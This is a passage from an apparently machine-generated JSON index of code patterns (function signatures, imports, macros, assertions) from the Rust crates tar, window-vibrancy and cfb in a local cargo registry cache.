          "fn _unpack(&mut self, dst: &Path) -> io::Result<()> {",
          "fn next(&mut self) -> Option<io::Result<Entry<'a, R>>> {",
          "fn next_entry_raw(",
          "fn next_entry(&mut self) -> io::Result<Option<Entry<'a, io::Empty>>> {",
          "fn parse_sparse_header(&mut self, entry: &mut EntryFields<'a>) -> io::Result<()> {",
          "fn skip(&mut self, mut amt: u64) -> io::Result<()> {",
          "fn next(&mut self) -> Option<io::Result<Entry<'a, io::Empty>>> {",
          "fn read(&mut self, into: &mut [u8]) -> io::Result<usize> {",
          "fn seek(&mut self, pos: SeekFrom) -> io::Result<u64> {",
          "fn try_read_all<R: Read>(r: &mut R, buf: &mut [u8]) -> io::Result<bool> {"
        ],
        "struct_defs": [
          "struct EntriesFields<'a> {"
        ],
        "impl_blocks": [
          "impl Archive<dyn Read + '_> {"
        ],
        "uses": [
          "use std::cell::{Cell, RefCell};",
          "use std::cmp;",
          "use std::convert::TryFrom;",
          "use std::fs;",
          "use std::io::prelude::*;",
          "use std::io::{self, SeekFrom};",
          "use std::marker;",
          "use std::path::Path;",
          "use crate::entry::{EntryFields, EntryIo};",
          "use crate::error::TarError;",
          "use crate::header::BLOCK_SIZE;",
          "use crate::other;",
          "use crate::pax::*;",
          "use crate::{Entry, GnuExtSparseHeader, GnuSparseHeader, Header};"
        ],
        "macros": [
          ".map_err(|e| TarError::new(format!(\"failed to create `{}`\", dst.display()), e))?"
        ],
        "derives": [],
        "error_handling": 41
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/builder.rs",
        "function_defs": [
          "fn _append_link(&mut self, header: &mut Header, path: &Path, target: &Path) -> io::Result<()> {",
          "fn as_write(&mut self) -> &mut dyn Write;",
          "fn as_write(&mut self) -> &mut dyn Write {",
          "fn start<'a>(",
          "fn do_finish(&mut self) -> io::Result<()> {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn drop(&mut self) {",
          "fn append(mut dst: &mut dyn Write, header: &Header, mut data: &mut dyn Read) -> io::Result<()> {",
          "fn pad_zeroes(dst: &mut dyn Write, len: u64) -> io::Result<()> {",
          "fn append_path_with_name(",
          "fn append_special(",
          "fn append_file(",
          "fn append_dir(",
          "fn prepare_header(size: u64, entry_type: u8) -> Header {",
          "fn prepare_header_path(dst: &mut dyn Write, header: &mut Header, path: &Path) -> io::Result<()> {",
          "fn prepare_header_link(",
          "fn prepare_header_sparse(",
          "fn append_extended_sparse_headers(dst: &mut dyn Write, entries: &SparseEntries) -> io::Result<()> {",
          "fn append_fs(",
          "fn append_dir_all(",
          "fn size(&self) -> u64 {",
          "fn find_sparse_entries(",
          "fn find_sparse_entries_seek(",
          "fn lseek(file: &fs::File, offset: i64, whence: libc::c_int) -> Result<i64, i32> {",
          "fn drop(&mut self) {",
          "fn test_find_sparse_entries() {",
          "fn loose_check_sparse_entries("
        ],
        "struct_defs": [
          "struct BuilderOptions {",
          "struct SparseEntries {",
          "struct SparseEntry {"
        ],
        "impl_blocks": [
          "impl EntryWriter<'_> {",
          "impl Write for EntryWriter<'_> {",
          "impl Drop for EntryWriter<'_> {",
          "impl SparseEntries {"
        ],
        "uses": [
          "use std::fs;",
          "use std::io;",
          "use std::io::prelude::*;",
          "use std::path::Path;",
          "use std::str;",
          "use crate::header::BLOCK_SIZE;",
          "use crate::header::GNU_SPARSE_HEADERS_COUNT;",
          "use crate::header::{path2bytes, HeaderMode};",
          "use crate::GnuExtSparseHeader;",
          "use crate::{other, EntryType, Header};",
          "use ::std::os::unix::fs::{FileTypeExt, MetadataExt};",
          "use std::os::unix::fs::MetadataExt as _;",
          "use std::os::unix::io::AsRawFd as _;",
          "use super::*;"
        ],
        "macros": [
          "/// assert!(archived_files.contains(&PathBuf::from(\"a.txt\")));",
          "/// assert!(archived_files.contains(&PathBuf::from(\"b.txt\")));",
          "format!(\"{} when getting metadata for {}\", err, path.display()),",
          "format!(\"{} when getting metadata for {}\", err, path.display()),",
          "Err(other(&format!(\"{} has unknown file type\", path.display())))",
          "return Err(other(&format!(",
          "return Err(other(&format!(\"{} has unknown file type\", path.display())));",
          "panic!(",
          "assert_eq!(reported, expected, \"Case: {description}\");"
        ],
        "derives": [
          "#[derive(Clone, Copy)]",
          "#[derive(Debug, Clone, PartialEq, Eq)]",
          "#[derive(Debug, Copy, Clone, PartialEq, Eq)]"
        ],
        "error_handling": 110
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/pax.rs",
        "function_defs": [
          "fn is_newline(a: &u8) -> bool {",
          "fn next(&mut self) -> Option<io::Result<PaxExtension<'entry>>> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io;",
          "use std::io::Write;",
          "use std::slice;",
          "use std::str;",
          "use crate::other;"
        ],
        "macros": [
          "write!(&mut data, \"{} {}=\", len, key)?;"
        ],
        "derives": [],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/tests/header/mod.rs",
        "function_defs": [
          "fn default_gnu() {",
          "fn goto_old() {",
          "fn goto_ustar() {",
          "fn link_name() {",
          "fn mtime() {",
          "fn user_and_group_name() {",
          "fn dev_major_minor() {",
          "fn set_path() {",
          "fn set_ustar_path_hard() {",
          "fn set_metadata_deterministic() {",
          "fn mk_header(path: &Path, readonly: bool) -> Result<Header, io::Error> {",
          "fn extended_numeric_format() {",
          "fn byte_slice_conversion() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fs::{self, File};",
          "use std::io::{self, Write};",
          "use std::path::Path;",
          "use std::{iter, mem, thread, time};",
          "use tempfile::Builder;",
          "use tar::{GnuHeader, Header, HeaderMode};"
        ],
        "macros": [
          "assert!(h.as_gnu().is_some());",
          "assert!(h.as_gnu_mut().is_some());",
          "assert!(h.as_ustar().is_none());",
          "assert!(h.as_ustar_mut().is_none());",
          "assert!(h.as_gnu().is_none());",
          "assert!(h.as_gnu_mut().is_none());",
          "assert!(h.as_ustar().is_none());",
          "assert!(h.as_ustar_mut().is_none());",
          "assert!(h.as_gnu().is_none());",
          "assert!(h.as_gnu_mut().is_none());",
          "assert!(h.as_ustar().is_some());",
          "assert!(h.as_ustar_mut().is_some());",
          "t!(h.set_link_name(\"foo\"));",
          "assert_eq!(t!(h.link_name()).unwrap().to_str(), Some(\"foo\"));",
          "t!(h.set_link_name(\"../foo\"));",
          "assert_eq!(t!(h.link_name()).unwrap().to_str(), Some(\"../foo\"));",
          "t!(h.set_link_name(\"foo/bar\"));",
          "assert_eq!(t!(h.link_name()).unwrap().to_str(), Some(\"foo/bar\"));",
          "t!(h.set_link_name(\"foo\\\\ba\"));",
          "if cfg!(windows) {",
          "assert_eq!(t!(h.link_name()).unwrap().to_str(), Some(\"foo/ba\"));",
          "assert_eq!(t!(h.link_name()).unwrap().to_str(), Some(\"foo\\\\ba\"));",
          "assert_eq!(t!(h.link_name()).unwrap().to_str(), Some(\"foo\\\\bar\"));",
          "assert!(h.set_link_name(\"\\0\").is_err());",
          "assert_eq!(t!(h.mtime()), 0);",
          "assert_eq!(t!(h.mtime()), 0);",
          "assert_eq!(t!(h.mtime()), 0);",
          "t!(h.set_username(\"foo\"));",
          "t!(h.set_groupname(\"bar\"));",
          "assert_eq!(t!(h.username()), Some(\"foo\"));",
          "assert_eq!(t!(h.groupname()), Some(\"bar\"));",
          "t!(h.set_username(\"foo\"));",
          "t!(h.set_groupname(\"bar\"));",
          "assert_eq!(t!(h.username()), Some(\"foo\"));",
          "assert_eq!(t!(h.groupname()), Some(\"bar\"));",
          "assert_eq!(t!(h.username()), None);",
          "assert_eq!(t!(h.groupname()), None);",
          "assert!(h.set_username(\"foo\").is_err());",
          "assert!(h.set_groupname(\"foo\").is_err());",
          "t!(h.set_device_major(1));",
          "t!(h.set_device_minor(2));",
          "assert_eq!(t!(h.device_major()), Some(1));",
          "assert_eq!(t!(h.device_minor()), Some(2));",
          "t!(h.set_device_major(1));",
          "t!(h.set_device_minor(2));",
          "assert_eq!(t!(h.device_major()), Some(1));",
          "assert_eq!(t!(h.device_minor()), Some(2));",
          "assert!(h.device_major().is_err());",
          "assert!(h.device_minor().is_err());",
          "assert!(h.device_major().is_err());",
          "assert!(h.device_minor().is_err());",
          "assert_eq!(t!(h.device_major()), None);",
          "assert_eq!(t!(h.device_minor()), None);",
          "assert!(h.set_device_major(1).is_err());",
          "assert!(h.set_device_minor(1).is_err());",
          "t!(h.set_path(\"foo\"));",
          "assert_eq!(t!(h.path()).to_str(), Some(\"foo\"));",
          "t!(h.set_path(\"foo/\"));",
          "assert_eq!(t!(h.path()).to_str(), Some(\"foo/\"));",
          "t!(h.set_path(\"foo/bar\"));",
          "assert_eq!(t!(h.path()).to_str(), Some(\"foo/bar\"));",
          "t!(h.set_path(\"foo\\\\bar\"));",
          "if cfg!(windows) {",
          "assert_eq!(t!(h.path()).to_str(), Some(\"foo/bar\"));",
          "assert_eq!(t!(h.path()).to_str(), Some(\"foo\\\\bar\"));",
          "t!(h.set_path(\"./control\"));",
          "assert_eq!(t!(h.path()).to_str(), Some(\"control\"));",
          "assert!(h.set_path(&long_name).is_err());",
          "assert!(h.set_path(&medium1).is_err());",
          "assert!(h.set_path(&medium2).is_err());",
          "assert!(h.set_path(\"\\0\").is_err());",
          "assert!(h.set_path(\"..\").is_err());",
          "assert!(h.set_path(\"foo/..\").is_err());",
          "assert!(h.set_path(\"foo/../bar\").is_err());",
          "t!(h.set_path(\"foo\"));",
          "assert_eq!(t!(h.path()).to_str(), Some(\"foo\"));",
          "assert!(h.set_path(&long_name).is_err());",
          "assert!(h.set_path(&medium1).is_err());",
          "t!(h.set_path(&medium2));",
          "assert_eq!(t!(h.path()).to_str(), Some(&medium2[..]));",
          "t!(h.set_path(&p));",
          "assert_eq!(t!(h.path()), p);",
          "let td = t!(Builder::new().prefix(\"tar-rs\").tempdir());",
          "let mut file = t!(File::create(path));",
          "t!(file.write_all(b\"c\"));",
          "let mut perms = t!(file.metadata()).permissions();",
          "t!(fs::set_permissions(path, perms));",
          "h.set_metadata_in_mode(&t!(path.metadata()), HeaderMode::Deterministic);",
          "let one = t!(mk_header(tmppath.as_path(), false));",
          "let two = t!(mk_header(tmppath.as_path(), true));",
          "assert_eq!(t!(one.size()), t!(two.size()));",
          "assert_eq!(t!(one.path()), t!(two.path()));",
          "assert_eq!(t!(one.mode()), t!(two.mode()));",
          "assert_eq!(t!(one.mtime()), t!(two.mtime()));",
          "assert_eq!(t!(one.mtime()), 1153704088);",
          "assert_eq!(t!(one.uid()), t!(two.uid()));",
          "assert_eq!(t!(one.gid()), t!(two.gid()));",
          "assert_eq!(h.size, [48, 48, 48, 48, 48, 48, 48, 48, 48, 53, 50, 0]);",
          "assert_eq!(h.size, [0x80, 0, 0, 0, 0, 0, 0, 0x02, 0, 0, 0, 1]);",
          "assert_eq!(h.size, [48, 48, 48, 48, 48, 48, 48, 48, 48, 53, 52, 0]);",
          "assert_eq!(h.as_header().entry_size().unwrap(), 0x0200000000);",
          "assert_eq!(h.as_header().entry_size().unwrap(), 43);",
          "assert_eq!(h.gid, [48, 48, 48, 48, 48, 53, 50, 0]);",
          "assert_eq!(h.as_header().gid().unwrap(), 42);",
          "assert_eq!(h.gid, [0xff; 8]);",
          "assert_eq!(h.as_header().gid().unwrap(), 0x7fffffffffffffff);",
          "assert_eq!(h.as_header().uid().unwrap(), 0x12345678);",
          "assert_eq!(h.as_header().mtime().unwrap(), 0x0123456789abcdef);",
          "assert_eq!(h.real_size().unwrap(), 0x00123456789abcde);",
          "assert_eq!(h.sparse[0].offset().unwrap(), 0x000123456789abcd);",
          "assert_eq!(h.sparse[0].length().unwrap(), 0x0000123456789abc);",
          "assert_eq!(b, b_conv);"
        ],
        "derives": [],
        "error_handling": 20
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/window-vibrancy-0.4.3",
    "name": "window-vibrancy-0.4.3",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/window-vibrancy-0.4.3/examples/tao.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use tao::platform::windows::{WindowBuilderExtWindows, WindowExtWindows};",
          "use tao::{",
          "use window_vibrancy::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/window-vibrancy-0.4.3/examples/winit.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use window_vibrancy::*;",
          "use winit::platform::windows::{WindowBuilderExtWindows, WindowExtWindows};",
          "use winit::{"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/window-vibrancy-0.4.3/src/macos.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [
          "impl NSVisualEffectView for id {"
        ],
        "uses": [
          "use super::{NSVisualEffectMaterial, NSVisualEffectState};",
          "use cocoa::{",
          "use objc::{class, msg_send, sel, sel_impl};",
          "use crate::Error;"
        ],
        "macros": [
          "eprintln!(\"\\\"NSVisualEffectView\\\" is only available on macOS 10.10 or newer\");",
          "if !msg_send![class!(NSThread), isMainThread] {",
          "msg_send![class!(NSVisualEffectView), alloc]"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, PartialEq)]",
          "#[derive(Clone, Copy, Debug, PartialEq)]",
          "#[derive(Clone, Copy, Debug, PartialEq)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/window-vibrancy-0.4.3/src/lib.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl std::fmt::Display for Error {",
          "impl std::error::Error for Error {}"
        ],
        "uses": [],
        "macros": [
          "write!(f, \"{}\", e)"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/window-vibrancy-0.4.3/src/windows.rs",
        "function_defs": [
          "fn get_function_impl(library: &str, function: &str) -> Option<FARPROC> {",
          "fn is_win7() -> bool {",
          "fn is_at_least_build(build: u32) -> bool {",
          "fn is_swca_supported() -> bool {",
          "fn is_undocumented_mica_supported() -> bool {",
          "fn is_backdroptype_supported() -> bool {"
        ],
        "struct_defs": [
          "struct ACCENT_POLICY {",
          "struct WINDOWCOMPOSITIONATTRIBDATA {"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::ffi::c_void;",
          "use crate::{Color, Error};"
        ],
        "macros": [
          "assert_eq!(library.chars().last(), Some('\\0'));",
          "assert_eq!(function.chars().last(), Some('\\0'));",
          "get_function_impl(concat!($lib, '\\0'), concat!(stringify!($func), '\\0'))",
          "get_function!(\"user32.dll\", SetWindowCompositionAttribute)"
        ],
        "derives": [
          "#[derive(PartialEq)]"
        ],
        "error_handling": 0
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3",
    "name": "cfb-0.7.3",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/tests/set_len.rs",
        "function_defs": [
          "fn create_data(len: usize) -> Vec<u8> {",
          "fn test_set_stream_len(initial_len: usize, resize_len: usize) {",
          "fn resize_zero_to_zero() {",
          "fn resize_small_to_zero() {",
          "fn resize_large_to_zero() {",
          "fn resize_small_to_slightly_smaller() {",
          "fn resize_small_to_slightly_bigger() {",
          "fn resize_small_to_large() {",
          "fn resize_large_to_small() {",
          "fn resize_large_to_huge() {",
          "fn resize_huge_to_large() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use cfb::{CompoundFile, Version};",
          "use std::io::{Cursor, Read, Write};"
        ],
        "macros": [
          "assert_eq!(stream.len(), initial_len as u64);",
          "assert_eq!(stream.len(), resize_len as u64);",
          "assert_eq!(actual_data.len(), resize_len);",
          "assert_eq!(actual_data, data[..resize_len]);",
          "assert_eq!(actual_data[..initial_len], data);",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/tests/malformed.rs",
        "function_defs": [
          "fn panic_after<T, F>(d: Duration, f: F) -> T",
          "fn can_read(path: &Path) {",
          "fn invalid_mini_sector_issue_16() {",
          "fn infinite_loop_difat_issue_17() {",
          "fn sector_panic_pr_24() {",
          "fn alloc_panic_pr_24() {",
          "fn minialloc_panic_pr_24() {",
          "fn check_for_infinite_loops() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use byteorder::{LittleEndian, WriteBytesExt};",
          "use cfb::CompoundFile;",
          "use std::{"
        ],
        "macros": [
          "Err(_) => panic!(\"Thread took too long\"),"
        ],
        "derives": [],
        "error_handling": 20
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/tests/large.rs",
        "function_defs": [
          "fn large_file_issue_12() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use cfb::CompoundFile;",
          "use rand::prelude::{Rng, SeedableRng};",
          "use rand_pcg::Pcg32;",
          "use std::io::{Cursor, Seek, SeekFrom, Write};",
          "use std::path::PathBuf;"
        ],
        "macros": [
          "path.push(format!(\"{:08x}\", rng.gen::<u64>()));"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/tests/basic.rs",
        "function_defs": [
          "fn read_root_storage_to_vec<F>(comp: &CompoundFile<F>) -> Vec<String> {",
          "fn read_storage_to_vec<F>(comp: &CompoundFile<F>, path: &str) -> Vec<String> {",
          "fn walk_to_vec(entries: &[Entry]) -> Vec<&Path> {",
          "fn file_too_small() {",
          "fn create_empty_compound_file() {",
          "fn empty_compound_file_has_no_children() {",
          "fn partial_final_sector() {",
          "fn root_entry() {",
          "fn create_directory_tree() {",
          "fn walk_directory_tree() {",
          "fn read_storage_on_stream() {",
          "fn open_stream_on_storage() {",
          "fn path_exists() {",
          "fn path_is_stream() {",
          "fn path_is_storage() {",
          "fn storage_clsids() {",
          "fn set_nonexistent_storage_clsid() {",
          "fn set_storage_clsid_for_stream() {",
          "fn state_bits() {",
          "fn set_nonexistent_state_bits() {",
          "fn create_storage_where_stream_exists() {",
          "fn create_storage_where_storage_exists() {",
          "fn create_root_storage() {",
          "fn create_storages_all() {",
          "fn create_storage_all_with_stream_in_the_way() {",
          "fn remove_storages() {",
          "fn remove_nonexistent_storage() {",
          "fn remove_root_storage() {",
          "fn remove_storage_on_stream() {",
          "fn remove_non_empty_storage() {",
          "fn remove_storage_all_on_storage() {",
          "fn remove_storage_all_on_root() {",
          "fn create_streams() {",
          "fn create_small_stream() {",
          "fn create_large_stream() {",
          "fn create_very_large_stream() {",
          "fn create_stream_where_stream_exists() {",
          "fn create_stream_where_storage_exists() {",
          "fn create_new_stream_where_stream_exists() {",
          "fn create_new_stream_where_storage_exists() {",
          "fn remove_streams() {",
          "fn remove_small_stream() {",
          "fn remove_nonexistent_stream() {",
          "fn remove_stream_on_storage() {",
          "fn truncate_stream() {",
          "fn extend_stream() {",
          "fn stream_seek() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use cfb::{CompoundFile, Entry, Version};",
          "use std::io::{Cursor, Read, Seek, SeekFrom, Write};",
          "use std::path::Path;",
          "use uuid::Uuid;"
        ],
        "macros": [
          "assert_eq!(comp.version(), version);",
          "assert_eq!(comp.entry(\"/\").unwrap().name(), \"Root Entry\");",
          "assert_eq!(cursor.get_ref().len(), 3 * version.sector_len());",
          "assert_eq!(comp.version(), version);",
          "assert_eq!(comp.entry(\"/\").unwrap().name(), \"Root Entry\");",
          "assert!(comp.entry(\"/\").unwrap().is_root());",
          "assert_eq!(comp.read_storage(\"/\").unwrap().count(), 0);",
          "assert_eq!(comp.read_root_storage().count(), 0);",
          "assert_eq!(cfb_data.len(), 6 * 4096);",
          "assert_eq!(&cfb_data[(5 * 4096)..], expected_final_sector.as_slice());",
          "assert_eq!(comp.entry(\"s\").unwrap().len(), stream_data.len() as u64);",
          "assert_eq!(actual_data, stream_data);",
          "assert_eq!(comp.root_entry().path(), comp.entry(\"/\").unwrap().path());",
          "assert_eq!(comp.root_entry().name(), comp.entry(\"/\").unwrap().name());",
          "assert!(comp.root_entry().is_root());",
          "assert_eq!(read_root_storage_to_vec(&comp), vec![\"baz\", \"foo\"]);",
          "assert_eq!(read_storage_to_vec(&comp, \"/\"), vec![\"baz\", \"foo\"]);",
          "assert_eq!(read_storage_to_vec(&comp, \"/foo\"), vec![\"bar\"]);",
          "assert!(read_storage_to_vec(&comp, \"/baz\").is_empty());",
          "assert!(read_storage_to_vec(&comp, \"/foo/bar\").is_empty());",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(walk_to_vec(&entries), vec![Path::new(\"/baz\")]);",
          "assert!(comp.exists(\"/\"));",
          "assert!(comp.exists(\"foo\"));",
          "assert!(comp.exists(\"/bar\"));",
          "assert!(!comp.exists(\"quux\"));",
          "assert!(comp.exists(\"bar/quux\"));",
          "assert!(!comp.exists(\"bar/foo\"));",
          "assert!(comp.exists(\"/bar/../foo\"));",
          "assert!(comp.exists(\"/bar/../bar\"));",
          "assert!(!comp.exists(\"../../foo\"));",
          "assert!(!comp.is_stream(\"/\"));",
          "assert!(comp.is_stream(\"foo\"));",
          "assert!(!comp.is_stream(\"/bar\"));",
          "assert!(!comp.is_stream(\"quux\"));",
          "assert!(comp.is_stream(\"bar/quux\"));",
          "assert!(!comp.is_stream(\"bar/foo\"));",
          "assert!(comp.is_stream(\"/bar/../foo\"));",
          "assert!(!comp.is_stream(\"/bar/../bar\"));",
          "assert!(!comp.is_stream(\"../../foo\"));",
          "assert!(comp.is_storage(\"/\"));",
          "assert!(!comp.is_storage(\"foo\"));",
          "assert!(comp.is_storage(\"/bar\"));",
          "assert!(!comp.is_storage(\"quux\"));",
          "assert!(!comp.is_storage(\"bar/quux\"));",
          "assert!(!comp.is_storage(\"bar/foo\"));",
          "assert!(!comp.is_storage(\"/bar/../foo\"));",
          "assert!(comp.is_storage(\"/bar/../bar\"));",
          "assert!(!comp.is_storage(\"../../bar\"));",
          "assert_eq!(comp.root_entry().clsid(), &uuid1);",
          "assert_eq!(comp.entry(\"/foo\").unwrap().clsid(), &uuid2);",
          "assert_eq!(comp.root_entry().clsid(), &uuid1);",
          "assert_eq!(comp.entry(\"/foo\").unwrap().clsid(), &uuid2);",
          "assert_eq!(comp.entry(\"foo\").unwrap().state_bits(), 0x12345678);",
          "assert_eq!(comp.entry(\"bar\").unwrap().state_bits(), 0x0ABCDEF0);",
          "assert_eq!(comp.root_entry().state_bits(), 0);",
          "assert_eq!(comp.entry(\"foo\").unwrap().state_bits(), 0x12345678);",
          "assert_eq!(comp.entry(\"bar\").unwrap().state_bits(), 0x0ABCDEF0);",
          "assert_eq!(read_storage_to_vec(&comp, \"/\"), vec![\"foo\"]);",
          "assert_eq!(read_storage_to_vec(&comp, \"/foo\"), vec![\"bar\"]);",
          "assert_eq!(read_storage_to_vec(&comp, \"/foo/bar\"), vec![\"baz\"]);",
          "assert!(comp.is_storage(\"/foo/bar/baz\"));",
          "assert_eq!(read_storage_to_vec(&comp, \"/\"), vec![\"baz\", \"quux\"]);",
          "assert!(read_storage_to_vec(&comp, \"/baz\").is_empty());",
          "assert_eq!(read_storage_to_vec(&comp, \"/\"), vec![\"stuff\"]);",
          "assert_eq!(read_storage_to_vec(&comp, \"/stuff\"), vec![\"foo\"]);",
          "assert!(read_storage_to_vec(&comp, \"/\").is_empty());",
          "assert_eq!(&data, \"foobar\");",
          "assert_eq!(&data, \"baz!\");",
          "assert_eq!(actual_data, data);",
          "assert_eq!(actual_data, data);",
          "assert_eq!(stream.len(), 1_000_000);",
          "assert_eq!(stream.seek(SeekFrom::End(0)).unwrap(), 1_000_000);",
          "assert_eq!(stream.len(), data2.len() as u64);",
          "assert_eq!(actual_data, data2);",
          "assert_eq!(read_storage_to_vec(&comp, \"/\"), vec![\"baz\", \"quux\"]);",
          "assert!(read_storage_to_vec(&comp, \"/baz\").is_empty());",
          "assert_eq!(stream.len(), 10000);",
          "assert_eq!(stream.seek(SeekFrom::Start(6000)).unwrap(), 6000);",
          "assert_eq!(stream.len(), 7000);",
          "assert_eq!(stream.seek(SeekFrom::Current(0)).unwrap(), 6000);",
          "assert_eq!(stream.len(), 5000);",
          "assert_eq!(stream.len(), 6000);",
          "assert_eq!(stream.len(), 6000);",
          "assert_eq!(actual_data.len(), 6000);",
          "assert!(actual_data == vec![b'x'; 6000]);",
          "assert_eq!(stream.len(), 0);",
          "assert_eq!(stream.len(), 2000);",
          "assert_eq!(stream.seek(SeekFrom::Start(1000)).unwrap(), 1000);",
          "assert_eq!(stream.len(), 2000);",
          "assert_eq!(stream.seek(SeekFrom::Current(0)).unwrap(), 1500);",
          "assert_eq!(stream.len(), 5000);",
          "assert_eq!(stream.seek(SeekFrom::Current(0)).unwrap(), 1500);",
          "assert_eq!(stream.len(), 5000);",
          "assert_eq!(stream.seek(SeekFrom::Current(0)).unwrap(), 2000);",
          "assert_eq!(stream.len(), 5000);",
          "assert_eq!(actual_data.len(), 5000);",
          "assert_eq!(&actual_data[0..1000], &[b'x'; 1000] as &[u8]);",
          "assert_eq!(&actual_data[1000..1500], &[b'y'; 500] as &[u8]);",
          "assert_eq!(&actual_data[1500..2000], &[b'z'; 500] as &[u8]);",
          "assert_eq!(&actual_data[2000..5000], &[0u8; 3000] as &[u8]);",
          "assert_eq!(data.len(), 512);",
          "assert_eq!(stream.len(), 512);",
          "assert_eq!(stream.seek(SeekFrom::Start(128)).unwrap(), 128);",
          "assert_eq!(buffer, vec![2; 128]);",
          "assert_eq!(stream.seek(SeekFrom::End(-128)).unwrap(), 384);",
          "assert_eq!(buffer, vec![4; 128]);",
          "assert_eq!(stream.seek(SeekFrom::Current(-256)).unwrap(), 256);",
          "assert_eq!(buffer, vec![3; 128]);"
        ],
        "derives": [],
        "error_handling": 153
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/examples/cfbtool.rs",
        "function_defs": [
          "fn split(path: &str) -> (PathBuf, PathBuf) {",
          "fn list_entry(name: &str, entry: &cfb::Entry, long: bool) {",
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use clap::{App, Arg, SubCommand};",
          "use std::io;",
          "use std::path::PathBuf;",
          "use time::OffsetDateTime;",
          "use uuid::Uuid;"
        ],
        "macros": [
          "println!(\"{}\", entry.name());",
          "format!(\"{} GB\", entry.len() / (1 << 30))",
          "format!(\"{} MB\", entry.len() / (1 << 20))",
          "format!(\"{} kB\", entry.len() / (1 << 10))",
          "format!(\"{} B \", entry.len())",
          "format!(\"{:04}-{:02}-{:02}\", year, month as u8, day)",
          "println!(",
          "println!(\" {}\", entry.clsid().hyphenated());"
        ],
        "derives": [],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/lib.rs",
        "function_defs": [
          "fn open_rw_with_path(path: &Path) -> io::Result<CompoundFile<fs::File>> {",
          "fn create_with_path(path: &Path) -> io::Result<CompoundFile<fs::File>> {",
          "fn stream_id_for_name_chain(&self, names: &[&str]) -> Option<u32> {",
          "fn entry_with_path(&self, path: &Path) -> io::Result<Entry> {",
          "fn open_stream_with_path(&mut self, path: &Path) -> io::Result<Stream<F>> {",
          "fn read_data_from_stream(",
          "fn create_storage_with_path(&mut self, path: &Path) -> io::Result<()> {",
          "fn create_storage_all_with_path(&mut self, path: &Path) -> io::Result<()> {",
          "fn remove_storage_with_path(&mut self, path: &Path) -> io::Result<()> {",
          "fn remove_storage_all_with_path(&mut self, path: &Path) -> io::Result<()> {",
          "fn set_storage_clsid_with_path(",
          "fn create_stream_with_path(",
          "fn remove_stream_with_path(&mut self, path: &Path) -> io::Result<()> {",
          "fn set_state_bits_with_path(",
          "fn touch_with_path(&mut self, path: &Path) -> io::Result<()> {",
          "fn write_data_to_stream(",
          "fn resize_stream(",
          "fn current_position(&self) -> u64 {",
          "fn flush_changes(&mut self) -> io::Result<()> {",
          "fn mark_modified(&mut self) {",
          "fn fill_buf(&mut self) -> io::Result<&[u8]> {",
          "fn consume(&mut self, amt: usize) {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn seek(&mut self, pos: SeekFrom) -> io::Result<u64> {",
